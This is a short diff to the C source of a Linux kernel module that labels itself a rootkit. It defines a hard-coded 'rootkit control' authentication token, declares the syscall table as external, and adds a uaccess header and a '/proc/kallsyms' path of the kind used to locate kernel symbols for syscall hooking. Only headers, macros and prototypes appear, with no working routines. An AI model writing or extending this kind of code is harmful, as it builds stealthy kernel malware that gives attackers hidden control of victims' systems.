@@ -5,6 +5,7 @@
 #include <linux/slab.h>
 #include <linux/list.h>
 #include <linux/fs.h>
+#include <linux/uaccess.h>
 #include <generated/autoconf.h>
 
 #define AUTH_TOKEN 0x12345678   // Authentication token for rootkit control
@@ -38,6 +39,8 @@
 #endif
 
 extern unsigned long *sys_call_table;
+
+#define KALL_SYMS_NAME          "/proc/kallsyms"
 
 char *strnstr(const char *haystack, const char *needle, size_t n);
 void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size);
